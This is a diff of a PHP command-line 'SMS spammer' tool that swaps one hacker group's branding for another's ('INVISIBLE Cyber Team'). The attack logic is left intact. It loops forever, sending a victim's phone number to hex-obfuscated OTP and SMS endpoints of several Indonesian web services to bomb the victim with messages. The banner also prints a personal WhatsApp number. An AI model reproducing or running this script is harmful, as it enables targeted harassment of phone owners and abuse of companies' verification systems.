@@ -1,5 +1,5 @@
 #!/usr/bin/env php
-#Dilarang copyright coded INDOnimous Cyber Team 2018 15 08 12:30
+#Dilarang copyright coded INVISIBLE Cyber Team 2018 15 08 12:30
 <?php
 if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     $R  = "";
@@ -31,11 +31,11 @@ if(function_exists('pcntl_signal')) {
 		global $Y,$X;
 		switch($signal) {
 		case SIGTERM:
-		die($Y."\n====================[] INDOnimous Cyber Team []=====(√√√)>".$X."\n");
+		die($Y."\n====================[] INVISIBLE Cyber Team []=====(√√√)>".$X."\n");
 		case SIGKILL:
-		die($Y."\n====================[] INDOnimous Cyber Team []=====(√√)>".$X."\n");
+		die($Y."\n====================[] INVISIBLE Cyber Team []=====(√√)>".$X."\n");
 		case SIGINT:
-		die($Y."\n====================[] INDOnimois Cyber Team []=====(√)>".$X."\n");
+		die($Y."\n====================[] INVISIBLE Cyber Team []=====(√)>".$X."\n");
 		}
 	}
 	pcntl_signal(SIGTERM, "signal_handler");
@@ -62,14 +62,14 @@ function post_data($url,$data) {
                   |_|
 ";
 
-echo $G."\n========[]SALAFI CYBER MUSLIM SPAMER[]========".$X."\n";
+echo $G."\n========[]INVISIBLE CYBER TEAM SPAMER[]========".$X."\n";
 echo  $YY. $B."\n::###############################################";
 echo $R."\n::############[WELCOME:MY:HOME]##################";
 echo $YY."\n::#:                                            #";
 echo $BB."\n::#:Penutor  ::[Author:or:MR.3]             #";
-echo $RR."\n::#:Github   ::[http://github.com/Mamang-hack:]  #";
-echo $R."\n::#:Facebook ::[SALAFIcyber:or:MR.3:]           #";
-echo $G."\n::#:YouTube  ::[SALAFI.CYBER.MUSLIM:]                    #";
+echo $RR."\n::#:Github   ::[http://github.com/INVISIBLE-CYBER TEAM:]  #";
+echo $R."\n::#:Facebook ::[INVISIBLE CYBEE TEAM:]           #";
+echo $G."\n::#:YouTube  ::[MAU BUAT DULU TOD :V:]                    #";
 echo $GG."\n::#:Whatsapp ::[0857 8129 1915]                 #";
 echo $YY."\n::#:                                            #";
 echo $R."\n::###########[THANKS:YOU:FOR:WATCHING]###########";
@@ -79,7 +79,7 @@ if(is_numeric($argv[1])) {
 	echo "[]Prossesing Spam SmS[] #".$G.$argv[1].$X."\n";
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
 	while(1) {
-		echo "[]INDOnimous Sending Massage To[] # ".$G.$argv[1].$X."\n";	
+		echo "[]INVISIBLE Sending Massage To[] # ".$G.$argv[1].$X."\n";	
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);
 	}
@@ -95,7 +95,7 @@ echo "[]Prossessing spam sms[] #".$G.$argv[2].$X."\n";
 endforeach;
 while(1) {
 foreach($argv[1] as $argv[2]):
-echo "[]INDOnimous Sending Massage To[] # ".$G.$argv[2].$X."\n";
+echo "[]INVISIBLE Sending Massage To[] # ".$G.$argv[2].$X."\n";
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);
 endforeach;
